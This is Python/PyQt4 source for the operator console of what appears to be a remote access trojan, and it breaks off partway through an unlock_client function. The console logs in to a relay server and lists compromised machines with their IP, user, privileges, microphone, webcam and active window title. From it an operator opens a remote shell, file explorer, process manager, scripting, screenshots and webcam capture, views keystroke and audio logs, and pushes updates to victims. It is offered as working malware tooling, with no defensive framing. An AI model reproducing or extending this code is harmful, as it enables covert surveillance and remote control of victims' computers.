# -*- coding: utf-8 -*-

import sys
import socket
import os
import time
import threading
import hashlib
import string
import random

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs import pygeoip
from libs.language import Translate
from ui import gui
from LogViewer import LogViewer
from libs.log_settings import LogSettings
from libs.settings import Config, Settings
from libs.data_transfer import data_receive, data_send, data_get
from modules.mexplorer import main as mexplorer
from modules.mshell import main as mshell
from modules.mprocesses import main as mprocesses
from modules.mscript import main as mscript
from modules.mdesktop import main as mdesktop
from modules.mwebcam import main as mwebcam


# initial geo ip database
geo_ip_database = pygeoip.GeoIP(os.path.join('assets', 'GeoIP.dat'))

# initial assets directories
temp = os.path.join(os.getcwd(), 'temp')
if not os.path.exists(temp):
    os.makedirs(temp)
assets = os.path.join(os.getcwd(), 'assets')
flags = os.path.join(assets, 'flags')

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


def get_ip_location(ip):
    try:
        country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
        if os.path.exists(country_flag):
            return country_flag
        else:
            return os.path.join(flags, 'blank.png')
    except:
        return os.path.join(flags, 'blank.png')


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        self.settings = Config()

        # set settings
        self.update_settings()

        # update gui
        self.gui = QApplication.processEvents


        self.ipv4Label.setText('[%s]' % str(self.IPADDRESS))

        # unlocked servers bank
        self.unlockedSockets = []

        # listen status
        self.acceptthreadState = False

        # Log Viewers
        self.log_viewers = {}

        # Modules bank
        self.modulesBank = {}

        # indexes for servers table
        self.index_of_moderator = 0
        self.index_of_ipAddress = 1
        self.index_of_alias = 2
        self.index_of_id = 3
        self.index_of_os = 4
        self.index_of_user = 5
        self.index_of_privs = 6
        self.index_of_lock = 7
        self.index_of_microphone = 8
        self.index_of_webcamera = 9
        self.index_of_activeWindowTitle = 10

        # initialize online clients table columns width
        self.clientsTable.setColumnWidth(self.index_of_moderator, 100)
        self.clientsTable.setColumnWidth(self.index_of_ipAddress, 100)
        self.clientsTable.setColumnWidth(self.index_of_alias, 100)
        self.clientsTable.setColumnWidth(self.index_of_id, 100)
        self.clientsTable.setColumnWidth(self.index_of_os, 100)
        self.clientsTable.setColumnWidth(self.index_of_user, 100)
        self.clientsTable.setColumnWidth(self.index_of_privs, 40)
        self.clientsTable.setColumnWidth(self.index_of_lock, 40)
        self.clientsTable.setColumnWidth(self.index_of_microphone, 40)
        self.clientsTable.setColumnWidth(self.index_of_webcamera, 40)

        # initialize moderators table columns width
        self.moderatorsTable.setColumnWidth(3, 120)

        # Init Filter Widgets
        self.init_filters()

        # Update Menu Buttons
        self.update_menu_buttons()

        # Hide Moderators Columns
        self.clientsTable.setColumnHidden(self.index_of_moderator, True)
        self.offlineClientsTable.setColumnHidden(0, True)

        # Shortcuts
        # Set Alias
        self.connect(QShortcut(QKeySequence(Qt.Key_F2), self), SIGNAL('activated()'), self.add_alias)

        # Connect & Disconnect triggers
        self.connectButton.clicked.connect(self.connect_to_server)
        self.disconnectButton.clicked.connect(self.disconnect_from_server)
        self.settingsButton.clicked.connect(self.run_settings)

        # Menu Triggers
        self.viewLogsButton.clicked.connect(self.view_logs)
        self.logSettingsButton.clicked.connect(self.set_logs_settings)
        self.setAliasButton.clicked.connect(self.add_alias)
        self.lockedButton.clicked.connect(self.unlock_client)
        self.unlockedButton.clicked.connect(self.lock_client)
        self.updateSourceButton.clicked.connect(self.update_source)
        self.shellButton.clicked.connect(lambda: self.execute_module(module='shell'))
        self.explorerButton.clicked.connect(lambda: self.execute_module(module='explorer'))
        self.proccessesButton.clicked.connect(lambda: self.execute_module(module='processes'))
        self.scriptingButton.clicked.connect(lambda: self.execute_module(module='scripting'))
        self.screenshotButton.clicked.connect(self.get_desktop_preview)
        self.webcamButton.clicked.connect(self.get_webcam_preview)
        self.setModeratorButton.clicked.connect(self.administrator_set_moderator)

        # servers table double click trigger
        self.clientsTable.doubleClicked.connect(self.unlock_client)
        # Initializing right click menu
        self.clientsTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.clientsTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
                     self.server_right_click_menu)

        # update menu button on click
        self.clientsTable.clicked.connect(self.update_menu_buttons)

        # ADMINISTRATOR BUTTONS
        self.getModeratorsButton.clicked.connect(self.get_moderators)
        self.addModeratorButton.clicked.connect(self.add_moderator)

        # Custom signal for update server table
        self.connect(self, SIGNAL('updateMenu()'), self.update_menu_buttons)
        self.connect(self, SIGNAL('updateTable()'), self.update_servers_table)
        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_module(module='shell'))
        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_module(module='explorer'))
        self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_module(module='scripting'))
        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_module(module='processes'))

        self.set_language()
        # disable administrator
        self.disable_administrator()

    def init_filters(self):

        # init filters
        self.filters = {
            'moderator': '',
            'ip_address': '',
            'alias': '',
            'key': '',
            'os': '',
            'user': '',
            'privs': '',
            'lock': '',
            'audio': '',
            'camera': '',
            'title': '',
        }

        self.offline_filters = {
            'moderator': '',
            'key': '',
            'alias': '',
            'ip_address': '',
        }

        self.clientsTable.setRowCount(1)

        self.offlineClientsTable.setRowCount(1)

        # Moderators
        self.filter_moderator_line = QLineEdit()
        self.filter_moderator_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_moderator_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_moderator_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_moderator, self.filter_moderator_line)

        # Ip Address
        self.filter_ipaddress_line = QLineEdit()
        self.filter_ipaddress_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_ipaddress_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_ipaddress_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_ipAddress, self.filter_ipaddress_line)

        # Alias
        self.filter_alias_line = QLineEdit()
        self.filter_alias_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_alias_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_alias_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_alias, self.filter_alias_line)

        # Socket
        self.filter_socket_line = QLineEdit()
        self.filter_socket_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_socket_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_socket_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_id, self.filter_socket_line)

        # Os
        self.filter_os_line = QLineEdit()
        self.filter_os_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_os_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_os_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_os, self.filter_os_line)

        # User
        self.filter_user_line = QLineEdit()
        self.filter_user_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_user_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_user_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_user, self.filter_user_line)

        # privs
        self.filter_privs_combo = QComboBox()
        self.filter_privs_combo.setEditable(True)
        self.filter_privs_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_privs_combo.addItem(QIcon(os.path.join(assets, 'admin.png')), _('INFO_ADMIN'), '1')
        self.filter_privs_combo.addItem(QIcon(os.path.join(assets, 'user.png')), _('INFO_USER'), '0')
        self.filter_privs_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_privs_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_privs, self.filter_privs_combo)

        # protection
        self.filter_lock_combo = QComboBox()
        self.filter_lock_combo.setEditable(True)
        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'lock.png')), _('INFO_LOCKED'), 'False')
        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'unlock.png')), _('INFO_UNLOCKED'), 'True')
        self.filter_lock_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_lock_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_lock, self.filter_lock_combo)

        # Audio
        self.filter_audio_combo = QComboBox()
        self.filter_audio_combo.setEditable(True)
        self.filter_audio_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_audio_combo.addItem(QIcon(os.path.join(assets, 'mic_yes.png')), _('INFO_YES'), ' ')
        self.filter_audio_combo.addItem(QIcon(os.path.join(assets, 'mic_no.png')), _('INFO_NO'), 'NoDevice')
        self.filter_audio_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_audio_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_microphone, self.filter_audio_combo)

        # Camera
        self.filter_camera_combo = QComboBox()
        self.filter_camera_combo.setEditable(True)
        self.filter_camera_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_camera_combo.addItem(QIcon(os.path.join(assets, 'web_camera.png')), _('INFO_YES'), ' ')
        self.filter_camera_combo.addItem(QIcon(os.path.join(assets, 'web_camera_no.png')), _('INFO_NO'), 'NoDevice')
        self.filter_camera_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_camera_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_webcamera, self.filter_camera_combo)

        # Active Window Title
        self.filter_title_line = QLineEdit()
        self.filter_title_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_title_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_title_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_activeWindowTitle, self.filter_title_line)

        # OFFLINE Clinets

        # Offline Moderators
        self.filter_moderator_line_offline = QLineEdit()
        self.filter_moderator_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_moderator_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_moderator_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 0, self.filter_moderator_line_offline)

        # Offline ID
        self.filter_id_line_offline = QLineEdit()
        self.filter_id_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_id_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_id_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 1, self.filter_id_line_offline)

        # Offline ID
        self.filter_alias_line_offline = QLineEdit()
        self.filter_alias_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_alias_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_alias_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 2, self.filter_alias_line_offline)

        # Offline Ip Address
        self.filter_ipaddress_line_offline = QLineEdit()
        self.filter_ipaddress_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_ipaddress_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_ipaddress_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 3, self.filter_ipaddress_line_offline)

    def filter_clients(self):
        self.filters = {
            'moderator': str(self.filter_moderator_line.text()),
            'ip_address': str(self.filter_ipaddress_line.text()),
            'alias': str(self.filter_alias_line.text()),
            'key': str(self.filter_socket_line.text()),
            'os': str(self.filter_os_line.text()),
            'user': str(self.filter_user_line.text()),
            'privs': str(self.filter_privs_combo.itemData(self.filter_privs_combo.currentIndex()).toPyObject()),
            'lock': str(self.filter_lock_combo.itemData(self.filter_lock_combo.currentIndex()).toPyObject()),
            'audio': str(self.filter_audio_combo.itemData(self.filter_audio_combo.currentIndex()).toPyObject()),
            'camera': str(self.filter_camera_combo.itemData(self.filter_camera_combo.currentIndex()).toPyObject()),
            'title': str(self.filter_title_line.text()),
        }

    def filter_offline_clinets(self):
        self.offline_filters = {
            'moderator': str(self.filter_moderator_line_offline.text()),
            'key': str(self.filter_id_line_offline.text()),
            'alias': str(self.filter_alias_line_offline.text()),
            'ip_address': str(self.filter_ipaddress_line_offline.text()),
        }

    def set_language(self):

        # MAIN
        self.setWindowTitle(_('TITLE'))

        # TABS
        self.clientsTabs.setTabText(0, _('CLIENTS_TAB_ONLINE'))
        self.clientsTabs.setTabText(1, _('CLIENTS_TAB_OFFLINE'))
        self.clientsTabs.setTabText(2, _('CLIENTS_TAB_MODERATORS'))

        # HEADERS
        self.clientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.clientsTable.horizontalHeaderItem(1).setText(_('HEADER_IP_ADDRESS'))
        self.clientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.clientsTable.horizontalHeaderItem(3).setText(_('HEADER_ID'))
        self.clientsTable.horizontalHeaderItem(4).setText(_('HEADER_OS'))
        self.clientsTable.horizontalHeaderItem(5).setText(_('HEADER_USER'))
        self.clientsTable.horizontalHeaderItem(6).setText(_('HEADER_PRIVS'))
        self.clientsTable.horizontalHeaderItem(7).setText(_('HEADER_LOCK'))
        self.clientsTable.horizontalHeaderItem(8).setText(_('HEADER_MIC'))
        self.clientsTable.horizontalHeaderItem(9).setText(_('HEADER_CAM'))
        self.clientsTable.horizontalHeaderItem(10).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))

        self.offlineClientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.offlineClientsTable.horizontalHeaderItem(1).setText(_('HEADER_ID'))
        self.offlineClientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.offlineClientsTable.horizontalHeaderItem(3).setText(_('HEADER_IP_ADDRESS'))
        self.offlineClientsTable.horizontalHeaderItem(4).setText(_('HEADER_LAST_ONLINE'))
        # END HEADERS

        # BOTTOM
        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
        self.ipv4TextLabel.setText(_('BOTTOM_IPV4'))
        self.serversOnlineStatus.setText(_('BOTTOM_SERVERS_TOTAL'))
        # END BOTTOM

        # ADMINISTRATION
        self.getModeratorsButton.setText(_('MODERATOR_GET_MODERATORS'))
        self.addModeratorButton.setText(_('MODERATOR_ADD_MDOERATOR'))

        self.moderatorsTable.horizontalHeaderItem(0).setText(_('MODERATORS_HEADER_ID'))
        self.moderatorsTable.horizontalHeaderItem(1).setText(_('MODERATORS_HEADER_ONLINE'))
        self.moderatorsTable.horizontalHeaderItem(2).setText(_('MODERATORS_HEADER_OFFLINE'))
        self.moderatorsTable.horizontalHeaderItem(3).setText(_('MODERATORS_HEADER_PRIVILEGES'))
        self.moderatorsTable.horizontalHeaderItem(4).setText(_('MODERATORS_HEADER_STATUS'))
        self.moderatorsTable.horizontalHeaderItem(5).setText(_('MODERATORS_HEADER_LASTONLINE'))
        # END ADMINISTRATION

    def connect_to_server(self):
        self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.session_id = id_generator(size=24)
            self.connection_socket.connect((self.IPADDRESS, self.PORT))
            if data_receive(self.connection_socket)['payload'] == 'connectSuccess':
                while 1:
                    username, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'),
                                                    QLineEdit.Normal)
                    if ok:
                        password, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'),
                                                        QLineEdit.Password)
                        if ok:
                            data = data_get(self.connection_socket, 'auth %s %s' % (str(username), str(password)), 'moderatorInitializing', self.session_id)
                            if data['mode'] == 'moderatorInitializing' and data['payload'].startswith('loginSuccess '):

                                # Get Privileges
                                self.privs = int(data['payload'].split()[-1])
                                if self.privs == 1:
                                    self.enable_administrator()
                                elif self.privs == 0:
                                    self.disable_administrator()

                                self.acceptthreadState = True
                                self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(self.session_id,))
                                self.servers_checker_thread.start()

                                # Set Login Status to Online
                                self.loginStatusLabel.setText(self.session_id)
                                self.loginStatusLabel.setStyleSheet('color: #2ecc71')
                                self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/connection.png")))

                                # Buttons
                                self.connectButton.setChecked(True)

                                return
                            elif data['payload'] == 'loginError':
                                warn = QMessageBox(QMessageBox.Warning, _('INCORRECT_CREDENTIALS'), _('INCORRECT_CREDENTIALS'))
                                ans = warn.exec_()
                                continue
                        else:
                            self.connectButton.setChecked(False)
                            return
                    else:
                        self.connectButton.setChecked(False)
                        return
        except socket.error:
            self.connectButton.setChecked(False)
            return

    def update_menu_buttons(self):
        try:

            client = self.current_client()
            if self.streaming_socks[client]['webcamera_device'] == 'NoDevice':
                self.webcamButton.setHidden(True)
            else:
                self.webcamButton.setHidden(False)

            if self.privs == 1:
                self.setModeratorButton.setHidden(False)
            else:
                self.setModeratorButton.setHidden(True)

            if self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_lock).text() == _('INFO_LOCKED'):
                self.onlineGroup.setHidden(False)
                self.viewLogsButton.setHidden(False)
                self.logSettingsButton.setHidden(False)
                self.setAliasButton.setHidden(False)
                self.unlockedButton.setHidden(True)
                self.lockedButton.setHidden(False)
                self.updateSourceButton.setHidden(False)
                self.shellButton.setHidden(True)
                self.explorerButton.setHidden(True)
                self.proccessesButton.setHidden(True)
                self.scriptingButton.setHidden(True)
            else:
                self.onlineGroup.setHidden(False)
                self.viewLogsButton.setHidden(False)
                self.logSettingsButton.setHidden(False)
                self.setAliasButton.setHidden(False)
                self.unlockedButton.setHidden(False)
                self.lockedButton.setHidden(True)
                self.updateSourceButton.setHidden(False)
                self.shellButton.setHidden(False)
                self.explorerButton.setHidden(False)
                self.proccessesButton.setHidden(False)
                self.scriptingButton.setHidden(False)

        except:
            self.onlineGroup.setHidden(True)

    # Enable Administrators Features
    def enable_administrator(self):
        # Online Clients Moderators
        self.clientsTable.showColumn(self.index_of_moderator)
        # Offline Clients Moderators
        self.offlineClientsTable.showColumn(0)
        # Moderators Tab
        self.clientsTabs.setTabEnabled(2, True)
        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/moderators.png")))

    # Disable Administrators Features
    def disable_administrator(self):
        # Online Clients Moderators
        self.clientsTable.setColumnHidden(self.index_of_moderator, True)
        # Offline Clients Moderators
        self.offlineClientsTable.setColumnHidden(0, True)
        # Moderators Tab
        self.clientsTabs.setTabEnabled(2, False)
        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/none.png")))

    def disconnect_from_server(self):
        # Clear Content
        self.clientsTable.setRowCount(1)
        self.offlineClientsTable.setRowCount(1)

        self.acceptthreadState = False

        try:
            del self.connection_socket
        except AttributeError:
            pass
        try:
            del self.checker_socket
        except AttributeError:
            pass

        # Clients count
        self.onlineStatus.setText('0')

        # Hide Moderator Column
        self.disable_administrator()

        # Set Login Status to None
        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
        self.loginStatusLabel.setStyleSheet('color: #e74c3c')
        self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/no_connection.png")))

        # Buttons
        self.connectButton.setChecked(False)

    def update_source(self):
        client = self.current_client()
        if client:
            data_send(self.connection_socket, 'updateSource', 'updateSource', self.session_id, client)

    def check_servers(self, session_id):
        # Init Checker Socket
        self.checker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.checker_socket.connect((self.IPADDRESS, self.PORT))
        if data_receive(self.checker_socket):
            while self.acceptthreadState:
                try:
                    data = data_get(self.checker_socket, 'getClients', 'getClients', session_id)
                    self.streaming_socks = data['payload']
                    self.emit(SIGNAL('updateMenu()'))
                    self.emit(SIGNAL('updateTable()'))
                    time.sleep(3)
                except socket.error:
                    self.disconnect_from_server()
                    self.acceptthreadState = False
                except SyntaxError:
                    self.disconnect_from_server()
                    self.acceptthreadState = False

    def view_logs(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'key': self.streaming_socks[client]['key'],
                'alias': self.streaming_socks[client]['alias'],
                'ip_address': self.streaming_socks[client]['ip_address'],
                'os': self.streaming_socks[client]['os'],
                'session_id': self.session_id,
                'assets': assets,
            }
            temp_id = id_generator()
            self.log_viewers[temp_id] = LogViewer(args)
            self.log_viewers[temp_id].show()

    def set_logs_settings(self):
        client = self.current_client()
        if client:
            args = {
                'sock':         self.connection_socket,
                'audio_device': self.streaming_socks[client]['audio_device'],
                'key':          self.streaming_socks[client]['key'],
                'kts':          self.streaming_socks[client]['kts'],
                'kt':           self.streaming_socks[client]['kt'],
                'ats':          self.streaming_socks[client]['ats'],
                'at':           self.streaming_socks[client]['at'],
                'sts':          self.streaming_socks[client]['sts'],
                'std':          self.streaming_socks[client]['std'],
                'st':           self.streaming_socks[client]['st'],
                'session_id':   self.session_id,
                'assets':       assets,
            }
            self.log_settings = LogSettings(args)
            self.log_settings.show()

    def get_desktop_preview(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'client': client,
                'session_id': self.session_id,
                'assets': assets,
            }
            self.desktop_desktop_preview = mdesktop.mainPopup(args)
            self.desktop_desktop_preview.show()

    def get_webcam_preview(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'client': client,
                'session_id': self.session_id,
                'assets': assets,
            }
            self.camera_preview_dialog = mwebcam.mainPopup(args)
            self.camera_preview_dialog.show()

    # Update Servers Table from self.socks
    def update_servers_table(self):

        online_clients = {}
        offline_clients = {}

        # Split Clients
        for index, key in enumerate(self.streaming_socks):
            if self.streaming_socks[key]['status']:
                if self.filters['moderator'] in self.streaming_socks[key]['moderator'] and \
                                self.filters['ip_address'] in self.streaming_socks[key]['ip_address'] and \
                                self.filters['alias'] in self.streaming_socks[key]['alias'] and \
                                self.filters['key'] in str(self.streaming_socks[key]['key']) and \
                                self.filters['os'] in self.streaming_socks[key]['os'] and \
                                self.filters['user'] in self.streaming_socks[key]['user'] and \
                                self.filters['privs'] in self.streaming_socks[key]['privileges'] and \
                                self.filters['lock'] in self.streaming_socks[key]['protection'] and \
                                self.filters['audio'] in self.streaming_socks[key]['audio_device'] and \
                                self.filters['camera'] in self.streaming_socks[key]['webcamera_device'] and \
                                self.filters['title'] in self.streaming_socks[key]['window_title']:
                    online_clients[index] = self.streaming_socks[key]
            else:
                if self.offline_filters['moderator'] in self.streaming_socks[key]['moderator'] and \
                                self.offline_filters['key'] in self.streaming_socks[key]['key'] and \
                                self.offline_filters['alias'] in self.streaming_socks[key]['alias'] and \
                                self.offline_filters['ip_address'] in self.streaming_socks[key]['ip_address']:
                    offline_clients[index] = self.streaming_socks[key]

        # Arange Clients Table
        self.clientsTable.setRowCount(len(online_clients) + 1)

        try:
            for index, obj in enumerate(online_clients):

                # add moderator
                item = QTableWidgetItem(online_clients[obj]['moderator'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                item.setTextColor(QColor('#f1c40f'))
                self.clientsTable.setItem(index + 1, self.index_of_moderator, item)

                # add ip address & county flag
                ip_address = online_clients[obj]['ip_address']
                item = QTableWidgetItem(ip_address)
                item.setIcon(QIcon(get_ip_location(ip_address)))
                self.clientsTable.setItem(index + 1, self.index_of_ipAddress, item)

                # add alias if avaiable
                alias = online_clients[obj]['alias']
                item = QTableWidgetItem(alias)
                self.clientsTable.setItem(index + 1, self.index_of_alias, item)

                # add socket number
                socket_value = str(online_clients[obj]['key'])
                item = QTableWidgetItem(socket_value)
                if socket_value == 'OFFLINE':
                    item.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.clientsTable.setItem(index + 1, self.index_of_id, item)

                # add os version
                item = QTableWidgetItem(online_clients[obj]['os'])
                item.setIcon(QIcon(os.path.join(assets, 'windows.png')))
                self.clientsTable.setItem(index + 1, self.index_of_os, item)

                # add server user
                item = QTableWidgetItem(online_clients[obj]['user'])
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.clientsTable.setItem(index + 1, self.index_of_user, item)

                # add user privileges
                try:
                    privs_status = _('INFO_USER') if not online_clients[obj]['privileges'] == '1' else _(
                        'INFO_ADMIN')
                except KeyError:
                    pass
                item = QTableWidgetItem()
                if privs_status == _('INFO_ADMIN'):
                    item.setIcon(QIcon(os.path.join(assets, 'admin.png')))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'user.png')))
                item.setText(privs_status)
                self.clientsTable.setItem(index + 1, self.index_of_privs, item)

                # add server lock status
                lock_status = _('INFO_LOCKED') if online_clients[obj]['protection'] == 'False' else _(
                    'INFO_UNLOCKED')
                item = QTableWidgetItem(lock_status)
                if lock_status == _('INFO_LOCKED'):
                    item.setTextColor(QColor('#e67e22'))
                    item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                else:
                    item.setTextColor(QColor('#2ecc71'))
                    item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                self.clientsTable.setItem(index + 1, self.index_of_lock, item)

                # add input device
                item = QTableWidgetItem()
                if online_clients[obj]['audio_device'] == 'NoDevice':
                    item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                    item.setText(_('INFO_NO'))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
                    item.setText(_('INFO_YES'))
                self.clientsTable.setItem(index + 1, self.index_of_microphone, item)

                # add webcam device
                item = QTableWidgetItem()
                if online_clients[obj]['webcamera_device'] == 'NoDevice':
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                    item.setText(_('INFO_NO'))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera.png')))
                    item.setText(_('INFO_YES'))
                self.clientsTable.setItem(index + 1, self.index_of_webcamera, item)

                # add active windows title
                item = QTableWidgetItem(online_clients[obj]['window_title'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(QColor('#1abc9c'))
                self.clientsTable.setItem(index + 1, self.index_of_activeWindowTitle, item)

        except RuntimeError:
            pass

        self.offlineClientsTable.setRowCount(len(offline_clients) + 1)
        try:
            for index, obj in enumerate(offline_clients):
                item = QTableWidgetItem(offline_clients[obj]['moderator'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                item.setTextColor(QColor('#f1c40f'))
                self.offlineClientsTable.setItem(index + 1, 0, item)

                item = QTableWidgetItem(offline_clients[obj]['key'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 1, item)

                item = QTableWidgetItem(offline_clients[obj]['alias'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 2, item)

                item = QTableWidgetItem(offline_clients[obj]['ip_address'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 3, item)

                item = QTableWidgetItem(offline_clients[obj]['last_online'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 4, item)

        except RuntimeError:
            pass

        # update servers online counter
        self.onlineStatus.setText(str(len(online_clients)))

    def unlock_client(self):
        while 1:
            client = self.current_client()
            if client:
